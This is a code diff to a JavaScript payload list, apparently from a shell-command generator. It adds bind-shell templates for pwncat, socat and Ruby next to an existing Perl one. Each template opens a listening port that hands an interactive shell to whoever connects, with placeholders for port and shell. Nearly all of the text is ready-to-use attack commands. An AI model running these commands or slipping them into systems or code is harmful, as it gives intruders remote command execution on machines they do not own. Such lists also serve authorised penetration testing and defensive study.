@@ -417,6 +417,21 @@ const bindShellCommands =  withCommandType(
             "command": "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
             "meta": ["bind", "mac", "linux"]
         },
+        {
+            "name": "pwncat Bind",
+            "command": "pwncat -l -e '{shell}' {port} -k",
+            "meta": ["bind", "mac", "linux"]
+        },
+        {
+            "name": "socat Bind",
+            "command": "LPORT={port}\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:{shell},pty,stderr,setsid,sigint,sane",
+            "meta": ["bind", "mac", "linux"]
+        },
+        {
+            "name": "Ruby Bind",
+            "command": "ruby -rsocket -e 's=TCPServer.new({port});while(c=s.accept);while(cmd=c.gets);IO.popen({shell},'r'){|io|c.print io.read}end;end'",
+            "meta": ["bind", "mac", "linux"]
+        }
     ]
 );
 
